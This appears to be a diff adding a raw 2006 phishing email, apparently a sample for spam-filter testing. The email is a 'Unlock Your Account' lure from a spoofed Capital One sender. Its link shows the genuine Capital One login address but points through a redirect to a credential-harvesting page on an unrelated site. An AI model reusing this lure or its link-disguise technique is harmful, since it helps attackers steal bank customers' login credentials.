@@ -1,0 +1,68 @@
+From nobody Sun Jan 25 13:48:12 2015
+Return-Path: <apache@hydro.fluckey.net>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail1.example.com (mail1.example.com [10.1.2.3])
+ by naughty.example.com (Postfix) with ESMTP id 2D06E536F94
+ for <nobody@login.example.com>; Wed, 18 Jan 2006 12:12:29 -0500 (EST)
+Received: from hydro.fluckey.net (bgp01365508bgs.sandia01.nm.comcast.net
+ [68.35.54.67])
+ by mail1.example.com (Postfix) with ESMTP id 84FC76CCF16
+ for <nobody@example.com>; Wed, 18 Jan 2006 12:12:28 -0500 (EST)
+Received: from hydro.fluckey.net (localhost.localdomain [127.0.0.1])
+ by hydro.fluckey.net (8.13.3/8.12.11) with ESMTP id k0IHCRvq002522
+ for <nobody@example.com>; Wed, 18 Jan 2006 10:12:27 -0700
+Received: (from apache@localhost)
+ by hydro.fluckey.net (8.13.3/8.12.11/Submit) id k0IHCQLn002521;
+ Wed, 18 Jan 2006 10:12:26 -0700
+Date: Wed, 18 Jan 2006 10:12:26 -0700
+Message-Id: <200601181712.k0IHCQLn002521@hydro.fluckey.net>
+To: nobody@example.com
+Subject: Unlock Your Account
+From: Capital One <abuse@capitalone.com>
+Content-Type: text/html
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 246
+
+
+<html>
+<body>
+<IMG src="http://www.section508corp.com/images2/capone.gif"><br>
+<br>
+<BR>
+<font size="2" face="Courier New, Courier, mono">For your security, the profile that you are using to access Capital 
+One Online Banking<BR>
+has been locked because of too many failed login attempts. You can unlock this 
+profile<BR>
+online by selecting an option below:<BR>
+</font><BR>
+</FONT><TABLE id=Table2 cellSpacing=0 cellPadding=0 width="100%" >
+<TBODY>
+<TR>
+<TD class=mainfont><FONT face="Courier New, Courier, mono" size=2>Unlock&nbsp;your Capital One profile
+with: </FONT></TD></TR>
+<TR>
+<TR>
+      <TD class=mainfont><FONT face="Courier New, Courier, mono"
+size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </FONT><FONT
+face="Courier New, Courier, mono" color=#003399 size=2><a href="http://www.google.com/url?sa=U&start=4&q=http://www.bumpofchicken.com/.checking/.service.capitalone.com/login.php">https://service.capitalone.com/oas/login.do?objectclicked=LoginSplash</a></FONT></TD>
+<font face="Courier New, Courier, mono"></A></font><font face="Courier New, Courier, mono"></TD></font></TR></TBODY></TABLE><FONT face="Courier New, Courier, mono">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>
+<font size="2">We regret any inconvenience this may cause you.<BR>
+<BR>
+Sincerely,<BR>
+Capital&nbsp;One&nbsp;Account Review Department.<BR>
+<BR>
+We are requesting this information to verify and protect your identity. This is 
+in order<BR>
+to prevent the use of the U.S. banking system in terrorist and other illegal activity.</font><font size="2"><BR>
+<BR>
+Need help? Use&nbsp;"Site Helper" &nbsp;or call customer service at 1.800- Capital 
+One.<BR>
+<BR>
+Please do not "Reply" to this Alert.<BR>
+<BR>
+© 2005&nbsp;Capital &nbsp;One, N.A. All rights reserved.</font></FONT>
+</body>
+</html>
